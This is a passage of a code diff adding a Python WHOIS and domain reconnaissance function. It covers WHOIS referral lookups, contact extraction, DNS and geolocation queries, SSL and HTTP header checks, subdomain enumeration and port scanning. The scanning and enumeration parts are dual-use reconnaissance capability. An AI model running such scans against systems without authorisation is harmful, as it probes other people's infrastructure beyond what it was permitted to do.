+                else:
+                    net = libs['ipaddress'].ip_network(ip_str + '/64', strict=False)
+                    net_data['network'] = str(net)
+                    net_data['netmask'] = str(net.netmask)
+            except:
+                pass
+            return net_data
+        except:
+            return {}
+    
+    def _18(domain_str):
+        try:
+            age_data = {}
+            try:
+                import whois
+                w = whois.whois(domain_str)
+                if w.creation_date:
+                    creation = w.creation_date
+                    if isinstance(creation, list):
+                        creation = creation[0]
+                    if isinstance(creation, libs['datetime']):
+                        age = libs['datetime'].now() - creation
+                        age_data['created'] = creation.strftime('%Y-%m-%d %H:%M:%S')
+                        age_data['days_old'] = age.days
+                        age_data['years_old'] = round(age.days / 365.25, 2)
+                
+                if w.expiration_date:
+                    expiry = w.expiration_date
+                    if isinstance(expiry, list):
+                        expiry = expiry[0]
+                    if isinstance(expiry, libs['datetime']):
+                        age_data['expires'] = expiry.strftime('%Y-%m-%d %H:%M:%S')
+                        days_left = (expiry - libs['datetime'].now()).days
+                        age_data['days_left'] = days_left
+                        if days_left < 30 and days_left > 0:
+                            age_data['expiry_warning'] = 'Expires in ' + str(days_left) + ' days!'
+                        elif days_left <= 0:
+                            age_data['expiry_warning'] = 'DOMAIN EXPIRED!'
+            except:
+                pass
+            return age_data
+        except:
+            return {}
+    
+    if validate_domain and not _2(domain):
+        output.append("│ [!] Invalid domain format: " + domain)
+        output.append("│ ●  Complete")
+        return "\n".join(output)
+    
+    tld_server = None
+    if tld_specific:
+        tld_server = _3(domain)
+        if tld_server:
+            output.append("│ ●  TLD-specific server: " + tld_server)
+            server = tld_server
+    
+    output.append("│ ●  Connecting to: " + server + ":" + str(port))
+    output.append("│ ●  Retry attempts: " + str(retry_attempts))
+    
+    raw_response, error = _4(domain, server, port)
+    
+    if error:
+        output.append("│ [!] Query failed: " + error)
+        if tld_server and server != tld_server:
+            output.append("│ ●  Attempting fallback")
+            raw_response, error = _4(domain, server, port)
+            if error:
+                output.append("│ [!] Fallback failed: " + error)
+                output.append("│ ●  Complete")
+                return "\n".join(output)
+        else:
+            output.append("│ ●  Complete")
+            return "\n".join(output)
+    
+    output.append("│ ●  Query successful")
+    output.append("│ ●  Response size: " + str(len(raw_response)) + " bytes")
+    
+    data_lines = _5(raw_response)
+    output.append("│ ●  Parsed " + str(len(data_lines)) + " lines")
+    
+    if filter_regex:
+        data_lines = _8(data_lines, filter_regex)
+        output.append("│ ●  Filtered: " + str(len(data_lines)) + " lines")
+    
+    if show_raw:
+        output.append("│")
+        output.append("│ ●  Raw Response:")
+        output.append("│ ──────────────────────────────")
+        for line in data_lines[:200]:
+            output.append("│ " + line)
+        if len(data_lines) > 200:
+            output.append("│ ... (" + str(len(data_lines) - 200) + " more)")
+        output.append("│ ──────────────────────────────")
+        output.append("│")
+    
+    parsed_info = {}
+    if parse_detailed:
+        parsed_info = _7(data_lines)
+        output.append("│ ●  Detailed parsing completed")
+        output.append("│ ●  Fields found: " + str(len(parsed_info.get('raw_fields', {}))))
+        output.append("│")
+        
+        if parsed_info.get('domain_name'):
+            output.append("│ Domain: " + ", ".join(parsed_info['domain_name'][:3]))
+            results_summary['domain'] = parsed_info['domain_name'][0] if parsed_info['domain_name'] else domain
+        else:
+            results_summary['domain'] = domain
+        
+        if parsed_info.get('registrar'):
+            output.append("│ Registrar: " + ", ".join(parsed_info['registrar'][:3]))
+            results_summary['registrar'] = parsed_info['registrar'][0] if parsed_info['registrar'] else ''
+        
+        if parsed_info.get('creation_date'):
+            output.append("│ Created: " + ", ".join(parsed_info['creation_date'][:3]))
+            results_summary['created'] = parsed_info['creation_date'][0] if parsed_info['creation_date'] else ''
+        
+        if parsed_info.get('expiry_date'):
+            output.append("│ Expires: " + ", ".join(parsed_info['expiry_date'][:3]))
+            results_summary['expires'] = parsed_info['expiry_date'][0] if parsed_info['expiry_date'] else ''
+        
+        if parsed_info.get('updated_date'):
+            output.append("│ Updated: " + ", ".join(parsed_info['updated_date'][:3]))
+        
+        if parsed_info.get('name_servers'):
+            output.append("│ Name Servers:")
+            for ns in parsed_info['name_servers'][:10]:
+                output.append("│   " + ns)
+            results_summary['nameservers'] = len(parsed_info['name_servers'])
+        
+        if parsed_info.get('status'):
+            output.append("│ Status:")
+            for status in parsed_info['status'][:10]:
+                output.append("│   " + status)
+        
+        if parsed_info.get('dnssec'):
+            output.append("│ DNSSEC: " + ", ".join(parsed_info['dnssec']))
+        
+        if parsed_info.get('registrant'):
+            output.append("│ Registrant: " + ", ".join(parsed_info['registrant'][:3]))
+        if parsed_info.get('registrant_organization'):
+            output.append("│ Registrant Org: " + ", ".join(parsed_info['registrant_organization'][:3]))
+        if parsed_info.get('registrant_country'):
+            output.append("│ Registrant Country: " + ", ".join(parsed_info['registrant_country']))
+        
+        if parsed_info.get('registry_domain_id'):
+            output.append("│ Registry ID: " + ", ".join(parsed_info['registry_domain_id']))
+        if parsed_info.get('registrar_iana'):
+            output.append("│ IANA ID: " + ", ".join(parsed_info['registrar_iana']))
+        if parsed_info.get('registrar_abuse_email'):
+            output.append("│ Abuse Email: " + ", ".join(parsed_info['registrar_abuse_email']))
+        
+        output.append("│")
+    
+    contacts = {}
+    if extract_contacts:
+        contacts = _10(data_lines)
+        output.append("│ ●  Contact Information:")
+        if contacts.get('emails'):
+            output.append("│   Emails (" + str(len(contacts['emails'])) + "):")
+            for email in contacts['emails'][:10]:
+                output.append("│     " + email)
+        if contacts.get('phones'):
+            output.append("│   Phones (" + str(len(contacts['phones'])) + "):")
+            for phone in contacts['phones'][:10]:
+                output.append("│     " + phone)
+        if contacts.get('urls'):
+            output.append("│   URLs:")
+            for url in contacts['urls'][:5]:
+                output.append("│     " + url[:100])
+        output.append("│")
+    
+    referral_server = None
+    if follow_referral and len(referral_chain) < max_redirects:
+        referral_server = _6(data_lines)
+        if referral_server and referral_server != server:
+            output.append("│ ●  Referral: " + referral_server)
+            referral_chain.append(referral_server)
+            
+            refer_data, refer_error = _4(domain, referral_server, port)
+            if not refer_error and refer_data:
+                output.append("│ ●  Referral data retrieved")
+                refer_lines = _5(refer_data)
+                if filter_regex:
+                    refer_lines = _8(refer_lines, filter_regex)
+                output.append("│ ●  Referral lines: " + str(len(refer_lines)))
+                
+                if parse_detailed:
+                    refer_parsed = _7(refer_lines)
+                    if refer_parsed.get('domain_name'):
+                        output.append("│   Referral Domain: " + ", ".join(refer_parsed['domain_name'][:3]))
+                    if refer_parsed.get('registrar'):
+                        output.append("│   Referral Registrar: " + ", ".join(refer_parsed['registrar'][:3]))
+                
+                for line in refer_lines[:20]:
+                    output.append("│ " + line)
+                if len(refer_lines) > 20:
+                    output.append("│ ... (" + str(len(refer_lines) - 20) + " more)")
+            else:
+                output.append("│ [!] Referral failed: " + (refer_error or "Unknown"))
+    
+    dns_data = {}
+    if dns_lookup:
+        output.append("│ ●  DNS lookup for " + domain)
+        try:
+            dns_data = _9()
+            output.append("│ ●  DNS completed")
+            if dns_data.get('a_records'):
+                output.append("│   A Records: " + ", ".join(dns_data['a_records'][:5]))
+                results_summary['ip_addresses'] = dns_data['a_records'][:3]
+                
+                if ip_lookup or asn_lookup or geolocation or network_range:
+                    for ip in dns_data['a_records'][:3]:
+                        output.append("│")
+                        output.append("│   IP: " + ip)
+                        
+                        if geolocation:
+                            geo = _11(ip)
+                            if geo:
+                                output.append("│     Geolocation:")
+                                if geo.get('country'): output.append("│       Country: " + geo['country'])
+                                if geo.get('region'): output.append("│       Region: " + geo['region'])
+                                if geo.get('city'): output.append("│       City: " + geo['city'])
+                                if geo.get('isp'): output.append("│       ISP: " + geo['isp'])
+                                if geo.get('org'): output.append("│       Org: " + geo['org'])
+                        
+                        if asn_lookup:
+                            asn = _12(ip)
+                            if asn:
+                                output.append("│     ASN:")
+                                if asn.get('asn'): output.append("│       ASN: " + asn['asn'])
+                                if asn.get('org'): output.append("│       Org: " + asn['org'])
+                                if asn.get('isp'): output.append("│       ISP: " + asn['isp'])
+                        
+                        if network_range:
+                            net = _17(ip)
+                            if net:
+                                output.append("│     Network:")
+                                if net.get('network'): output.append("│       Network: " + net['network'])
+                                if net.get('netmask'): output.append("│       Netmask: " + net['netmask'])
+                                if net.get('broadcast'): output.append("│       Broadcast: " + net['broadcast'])
+                        
+                        if reverse_dns:
+                            try:
+                                import socket
+                                rev_host = socket.gethostbyaddr(ip)[0]
+                                output.append("│     Reverse DNS: " + rev_host)
+                            except:
+                                output.append("│     Reverse DNS: Failed")
+            
+            if dns_data.get('aaaa_records'):
+                output.append("│   AAAA Records: " + ", ".join(dns_data['aaaa_records'][:5]))
+            if dns_data.get('mx_records'):
+                output.append("│   MX Records:")
+                for mx in dns_data['mx_records'][:5]:
+                    output.append("│     " + mx)
+                results_summary['mx_count'] = len(dns_data['mx_records'])
+            if dns_data.get('ns_records'):
+                output.append("│   NS Records: " + ", ".join(dns_data['ns_records'][:5]))
+                results_summary['ns_count'] = len(dns_data['ns_records'])
+            if dns_data.get('txt_records'):
+                output.append("│   TXT Records:")
+                for txt in dns_data['txt_records'][:3]:
+                    output.append("│     " + txt[:100] + ("..." if len(txt) > 100 else ""))
+            if dns_data.get('cname'):
+                output.append("│   CNAME: " + ", ".join(dns_data['cname']))
+            if dns_data.get('soa'):
+                output.append("│   SOA: " + ", ".join(dns_data['soa'][:3]))
+            output.append("│")
+        except Exception as e:
+            output.append("│ [!] DNS failed: " + str(e))
+            output.append("│")
+    
+    if domain_age:
+        output.append("│ ●  Domain age calculation")
+        try:
+            age_data = _18(domain)
+            if age_data:
+                output.append("│   Domain Age:")
+                if age_data.get('created'):
+                    output.append("│     Created: " + age_data['created'])
+                if age_data.get('days_old'):
+                    output.append("│     Age: " + str(age_data['days_old']) + " days (" + str(age_data.get('years_old', 0)) + " years)")
+                if age_data.get('expires'):
+                    output.append("│     Expires: " + age_data['expires'])
+                if age_data.get('days_left') is not None:
+                    output.append("│     Days until expiry: " + str(age_data['days_left']))
+                if age_data.get('expiry_warning'):
+                    output.append("│ [!] " + age_data['expiry_warning'])
+                output.append("│")
+        except Exception as e:
+            output.append("│ [!] Age calculation failed: " + str(e))
+            output.append("│")
+    
+    if ssl_cert:
+        output.append("│ ●  SSL certificate check")
+        try:
+            cert_data = _13(domain)
+            if cert_data:
+                output.append("│   SSL Certificate:")
+                if cert_data.get('subject'):
+                    output.append("│     Subject: " + str(cert_data['subject']))
+                if cert_data.get('issuer'):
+                    output.append("│     Issuer: " + str(cert_data['issuer']))
+                if cert_data.get('not_before'):
+                    output.append("│     Valid From: " + cert_data['not_before'])
+                if cert_data.get('not_after'):
+                    output.append("│     Valid Until: " + cert_data['not_after'])
+                output.append("│")
+            else:
+                output.append("│ [!] No SSL certificate found")
+                output.append("│")
+        except Exception as e:
+            output.append("│ [!] SSL check failed: " + str(e))
+            output.append("│")
+    
+    if http_headers:
+        output.append("│ ●  HTTP headers")
+        try:
+            headers = _14(domain)
+            if headers:
+                output.append("│   HTTP Headers:")
+                if headers.get('status_code'):
+                    output.append("│     Status: " + str(headers['status_code']))
+                if headers.get('Server'):
+                    output.append("│     Server: " + headers['Server'])
+                if headers.get('Content-Type'):
+                    output.append("│     Content-Type: " + headers['Content-Type'])
+                if headers.get('X-Powered-By'):
+                    output.append("│     X-Powered-By: " + headers['X-Powered-By'])
+                output.append("│     Total: " + str(len(headers)) + " headers")
+                output.append("│")
+            else:
+                output.append("│ [!] Failed to fetch headers")
+                output.append("│")
+        except Exception as e:
+            output.append("│ [!] HTTP check failed: " + str(e))
+            output.append("│")
+    
+    subdomains = []
+    if subdomain_scan:
+        output.append("│ ●  Subdomain scan")
+        try:
+            subdomains = _15(domain)
+            if subdomains:
+                output.append("│   Found " + str(len(subdomains)) + " subdomains:")
+                for sub in subdomains[:20]:
+                    output.append("│     " + sub)
+                if len(subdomains) > 20:
+                    output.append("│     ... and " + str(len(subdomains) - 20) + " more")
+                output.append("│")
+            else:
+                output.append("│ [!] No subdomains found")
+                output.append("│")
+        except Exception as e:
+            output.append("│ [!] Subdomain scan failed: " + str(e))
+            output.append("│")
+    
+    open_ports = []
+    if ports_scan:
+        output.append("│ ●  Port scan")
+        try:
+            open_ports = _16(domain)
+            if open_ports:
+                service_map = {
+                    21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
+                    80: 'HTTP', 110: 'POP3', 135: 'MSRPC', 139: 'NetBIOS',
+                    143: 'IMAP', 443: 'HTTPS', 445: 'SMB', 993: 'IMAPS',
+                    995: 'POP3S', 1723: 'PPTP', 3306: 'MySQL', 3389: 'RDP',
+                    5432: 'PostgreSQL', 5900: 'VNC', 6379: 'Redis',
+                    8080: 'HTTP-Alt', 8443: 'HTTPS-Alt', 27017: 'MongoDB'
+                }
+                output.append("│   Open ports: " + ", ".join(map(str, open_ports)))
+                output.append("│   Services:")
+                for port in open_ports:
+                    service = service_map.get(port, 'Unknown')
+                    output.append("│     Port " + str(port) + ": " + service)
+                output.append("│")
+            else:
+                output.append("│ [!] No open ports found")
+                output.append("│")
+        except Exception as e:
+            output.append("│ [!] Port scan failed: " + str(e))
+            output.append("│")
+    
+    if output_format == 'summary':
+        output.append("│")
+        output.append("│ ●  SUMMARY")
+        output.append("│ ──────────────────────────────")
+        output.append("│   Domain: " + results_summary.get('domain', domain))
+        if parsed_info.get('registrar'):
+            output.append("│   Registrar: " + ", ".join(parsed_info['registrar'][:2]))
+        if parsed_info.get('creation_date'):
+            output.append("│   Created: " + ", ".join(parsed_info['creation_date'][:2]))
+        if parsed_info.get('expiry_date'):
+            output.append("│   Expires: " + ", ".join(parsed_info['expiry_date'][:2]))
+        if parsed_info.get('name_servers'):
+            output.append("│   Name Servers: " + ", ".join(parsed_info['name_servers'][:3]))
+        if contacts.get('emails'):
+            output.append("│   Emails: " + ", ".join(contacts['emails'][:3]))
+        if dns_data.get('a_records'):
+            output.append("│   IPs: " + ", ".join(dns_data['a_records'][:2]))
+        output.append("│ ──────────────────────────────")
+        output.append("│")
+    
+    if verbose:
+        output.append("│")
+        output.append("│ ●  Statistics:")
+        output.append("│   Total lines: " + str(len(data_lines)))
+        output.append("│   Referrals: " + str(len(referral_chain)))
+        output.append("│   Parsed fields: " + str(len(parsed_info.get('raw_fields', {}))))
+        output.append("│   Contacts - Emails: " + str(len(contacts.get('emails', []))))
+        output.append("│   Contacts - Phones: " + str(len(contacts.get('phones', []))))
+        if dns_lookup:
+            output.append("│   DNS - A: " + str(len(dns_data.get('a_records', []))))
+            output.append("│   DNS - MX: " + str(len(dns_data.get('mx_records', []))))
+            output.append("│   DNS - NS: " + str(len(dns_data.get('ns_records', []))))
+        output.append("│")
+    
+    if output_csv:
+        try:
+            import csv
+            with open(csv_file, 'w', newline='', encoding='utf-8') as f:
+                writer = csv.writer(f)
+                writer.writerow(['Domain', 'Registrar', 'Created', 'Expires', 'Name Servers', 'IPs'])
+                writer.writerow([
+                    results_summary.get('domain', domain),
+                    ', '.join(parsed_info.get('registrar', [])[:2]),
+                    ', '.join(parsed_info.get('creation_date', [])[:2]),
+                    ', '.join(parsed_info.get('expiry_date', [])[:2]),
+                    ', '.join(parsed_info.get('name_servers', [])[:3]),
+                    ', '.join(dns_data.get('a_records', [])[:2]) if dns_lookup else ''
+                ])
+            output.append("│ ●  CSV saved: " + csv_file)
+            output.append("│")
+        except Exception as e:
+            output.append("│ [!] CSV save failed: " + str(e))
+            output.append("│")
+    
+    full_output = "\n".join(output)
+    
+    if save_to_file:
+        try:
+            with open(save_to_file, 'w', encoding='utf-8') as f:
+                f.write(full_output)
+            output.append("│ ●  Results saved: " + save_to_file)
+            output.append("│")
+        except Exception as e:
+            output.append("│ [!] File save failed: " + str(e))
+            output.append("│")
+    
+    output.append("│ ●  Whois lookup completed")
+    output.append("│ ●  Complete")
+    
+    return "\n".join(output)
